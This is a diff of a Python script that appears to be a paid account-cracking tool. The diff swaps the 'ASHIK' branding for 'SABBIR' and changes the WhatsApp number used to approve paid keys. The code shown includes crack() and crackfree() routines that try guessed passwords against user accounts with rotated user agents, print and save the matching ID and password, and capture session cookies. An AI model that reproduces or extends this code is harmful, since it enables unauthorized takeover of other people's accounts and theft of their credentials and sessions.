@@ -277,7 +277,7 @@ def meyexudi():
       print(' \x1b[38;5;50m║══[𝟸] 30 DAY 400 TAKA ')
       print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
       input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801935091078?text='+tks),approval()      
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801840762780?text='+tks),approval()      
       time.sleep(1)
       meyexudi()
   except:
@@ -724,7 +724,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,CP
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;92m{bo}[ASHIK-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;92m{bo}[SABBIR-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -754,7 +754,7 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m\033[1;91m[\033[1;92mASHIK-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " ASHIK,  Ok,  id"')
+                os.system('espeak -a 300 " SABBIR,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
@@ -768,7 +768,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,CP
-    sys.stdout.write(f"\r{H}[ASHIK-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[SABBIR-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -796,9 +796,9 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ASHIK-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•SABBIR-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " ASHIK,  Ok,  id"')
+                os.system('espeak -a 300 " SABBIR,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
